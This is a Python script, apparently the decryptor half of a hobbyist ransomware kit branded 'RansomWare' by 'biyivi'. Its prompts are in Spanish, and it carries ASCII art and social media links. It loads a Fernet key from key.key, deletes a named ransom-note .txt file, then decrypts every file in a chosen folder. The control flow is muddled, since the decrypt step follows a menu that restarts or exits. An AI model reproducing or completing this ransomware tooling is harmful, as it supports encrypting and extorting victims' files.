from cryptography.fernet import Fernet
import os 
import colorama
from colorama import Fore,Back,Style
from time import sleep
import time






def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)


def ransomdecrypt():
    def cargar_key():
        return open ('key.key', 'rb').read()

    def decrypt(items, key):
        f = Fernet(key)
        for item in items: 
            with open(item, 'rb') as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(item, 'wb') as file:
                file.write(decrypted_data)


    def stt():
        try:
            while True:
                clearConsole()
                print(Fore.RED+'''
 
            .------------. ▄▄▄   ▄▄▄·  ▐ ▄ .▄▄ ·       • ▌ ▄ ·. ▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄ .
            |.----------.| ▀▄ █·▐█ ▀█ •█▌▐█▐█ ▀. ▪     ·██ ▐███▪██· █▌▐█▐█ ▀█ ▀▄ █·▀▄.▀·
            ||>unlock#  || ▐▀▀▄ ▄█▀▀█ ▐█▐▐▌▄▀▀▀█▄ ▄█▀▄ ▐█ ▌▐▌▐█·██▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▪▄
            ||          || ▐█•█▌▐█ ▪▐▌██▐█▌▐█▄▪▐█▐█▌.▐▌██ ██▌▐█▌▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█▄▄▌
            |"----------'|. ▀  ▀ ▀  ▀ ▀▀ █▪ ▀▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀ ▀▀▀                     
          .-^------------^-.
          |by:'''+Fore.MAGENTA+''' b i y i  v i'''+Fore.RED+'''|
          "----------------'                    
                    '''+Style.RESET_ALL)
                path_to_encrypt = input(Fore.RED+"*)"+Fore.YELLOW+"Ubicación del archivo (ejemplo: C:\\Users\\User\\Desktop\\Nom_Carpeta): "+Fore.GREEN)
                txt=input( Fore.RED+"*)"+Fore.YELLOW+"Ingresar el nombre del archivo .txt(sin la extencion '.txt'): "+Fore.GREEN)
                os.remove(path_to_encrypt+'\\'+txt+'.txt')
                s=Fore.RED+Style.BRIGHT+"Proceso terminado.."
                for i in s:
                    print (i, end="", flush=True)
                    sleep(0.1)
                print("")
                print(Fore.YELLOW+"Elige una opcion:")
                print(Fore.RED+"1)"+Fore.MAGENTA+"Utilizar el script otra vez")
                print(Fore.RED+"2)"+Fore.MAGENTA+"Salir")
                rp=int(input(Fore.GREEN+">> "))
                if rp==1:
                    stt()
                elif rp==2:
                    exit()
                else:
                    print(Fore.RED+"Opcion invalida!")
                    time.sleep(2)




                items = os.listdir(path_to_encrypt)
                full_path = [path_to_encrypt+'\\'+item for item in items]

                key = cargar_key()
                decrypt(full_path, key)
        except Exception as e:
            print("")
            print(Fore.RED+"--Error--\nRazon:",e)
            time.sleep(4)
            stt()
        except KeyboardInterrupt:
            print("")
            print(Fore.RED+Style.BRIGHT+"\nDetenido por el usuario"+Fore.RESET)
            time.sleep(2)
            print(Fore.MAGENTA+Style.BRIGHT+'''
                                                                                               
                           ,,.*((####(###(//***, ***                            
                      /./#################(/********** .(                       
                   .(#####################(/************** *.                   
                ,%########################(/***************** ,                 
              .##########################(//********************,               
            ,(#############################/*********************.,             
           *##############################//*********************** .           
          /###############################(/************************ ,          
         *###############################(/**************************           
        .###############################(//******  . ..  . ...  ******.         
       .################################(((/***    ***********    .*** *        
       /(################################(//****************************        
       ,##################################(/***********          *******        
       ,#########(#########(/##############//*****   *,  .******** *****        
       ,########(           .##((#########(/**. ,*****.  .*************/        
       ,#################/       .########(/ *********   *************/,        
       /(####################/     .#####(/*******/*,   ..  ,***/*.***,*        
       ((###########(/***/((#############(/***, ,.****,,***,,,.. .****.(       
       ./##########/.         ,##########(/**.             ,,.     ,**..        
        ,################################//****, ..,,*,   , /*********        
         ################################(/************   ************          
        ((###############################(//***********   ************(     
         ,###############################(/***********,   ***********.          
         *(#############################(/******* *************** .*/,          
          .#############################(/******** .    ..,,.    .**.           
           .(##################. ,#######(/**   * .,,,,*,,,,,,, */*.            
            ,/##################### ,(###(. ,,,,,,,,,,,,,,, ,, ***,             
             (//#########################(*,,,,,,,,,,,,,,. ,.,* ,/              
              ,*,#######################(/*,,,,,,,,..   ,,,.**. /               
                .(,####################/.        ..,,, .. ** *.     
                 /(*/###################(**,,...   .,.**.* ,./              
                   .#,(##################(*,,,,,  **** **./                     
                     *(,(###############/**********, ** * /             
                      //#,##############(/******* *** *,(                       
                        #,#*(###########//********,,*.(                         
                           .(#/#########//****** **.                            
                              .(########//*****,.*                              
                                 ,.*(##(//* ./

# Redes sociales:
# Youtube: biyivi
https://www.youtube.com/channel/UCRitJ4OwEQmpk_aEPK9INkw
# Instagram: @b.i.y.i.v.i
https://www.instagram.com/b.i.y.i.v.i/
# TikTok: @biyivi
https://www.tiktok.com/@biyivi
# github: biyivi 
https://github.com/biyivi


Adios :)               
                ''')

    stt()

ransomdecrypt()